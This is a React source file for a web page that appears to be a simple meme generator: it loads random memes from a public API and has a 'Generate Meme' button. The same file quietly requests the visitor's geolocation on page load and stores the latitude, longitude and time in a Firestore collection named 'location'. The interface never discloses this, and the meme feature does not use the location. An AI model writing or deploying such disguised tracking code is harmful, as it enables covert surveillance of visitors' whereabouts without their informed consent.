import { useEffect, useState } from 'react';
import './App.css';
import { db } from './firebase-config';
import { addDoc, collection } from 'firebase/firestore';

function App() {
  const [location, setLocation] = useState({});
  const [meme, setMeme] = useState(null);

  const userCollectionRef = collection(db, 'location');

  const writeLocation = async () => {
    await addDoc(userCollectionRef, {
      latitude: location?.latitude || 0,
      longitude: location?.longitude || 0,
      time: Date(),
    });
  };

  useEffect(() => {
    navigator.geolocation.getCurrentPosition((loc) => {
      setLocation({
        latitude: loc.coords.latitude,
        longitude: loc.coords.longitude,
      });
    });
  }, []);

  useEffect(() => {
    if (location?.latitude && location?.longitude) {
      writeLocation();
    }
  }, [location]);

  useEffect(() => {
    const fetchMeme = async () => {
      const response = await fetch('https://meme-api.com/gimme');
      const data = await response.json();
      setMeme(data);
    };
    fetchMeme();
  }, []);

  const handleClick = async () => {
    const response = await fetch('https://meme-api.com/gimme');
    const data = await response.json();
    setMeme(data);
  };

  return (
    <div className='App'>
      <header className='App-header'>
        <div>
          {meme && (
            <img
              src={meme.url}
              alt={meme.name}
              style={{
                width: '300px',
                maxHeight: '500px',
                borderRadius: '5px',
              }}
            />
          )}
          <button
            onClick={handleClick}
            className={'generate-button'}
          >
            Generate Meme
          </button>
        </div>
      </header>
    </div>
  );
}

export default App;
